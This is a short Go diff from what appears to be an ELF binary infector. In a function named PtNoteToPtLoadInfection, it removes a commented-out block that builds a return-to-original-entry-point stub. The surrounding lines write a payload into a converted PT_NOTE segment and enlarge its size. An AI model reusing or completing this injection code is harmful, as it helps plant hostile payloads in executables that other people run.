@@ -67,13 +67,6 @@ func (t *TargetBin) PtNoteToPtLoadInfection(opts InfectOpts) error {
 			t.Payload.Write(retStub)
 		}
 		
-		/*
-		if !((opts & NoRetOEP) == NoRetOEP) {
-			retStub := modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
-			t.Payload.Write(retStub)
-		}
-		*/
-		
 		plen := uint64(t.Payload.Len())
 
 		t.Phdrs.([]elf.Prog64)[noteNdx].Filesz += plen
